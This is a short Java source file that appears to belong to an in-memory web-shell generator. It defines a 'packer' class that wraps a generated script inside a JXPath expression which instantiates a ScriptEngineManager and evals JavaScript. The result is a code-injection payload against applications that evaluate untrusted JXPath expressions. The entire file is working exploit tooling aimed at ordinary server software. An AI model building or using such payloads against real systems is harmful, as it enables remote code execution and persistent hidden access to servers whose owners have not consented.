package org.leo.jmg.mem.packer.jxpath;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

@PackerMeta(name = "JXPathScriptEngine", group = "JXPath", order = 1)
public class JXPathScriptEnginePacker implements Packer {
    String template = "eval(getEngineByName(javax.script.ScriptEngineManager.new(), 'js'), '{{script}}')";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("ScriptEngineNoSquareBrackets").pack(config);
        return template.replace("{{script}}", script);
    }
}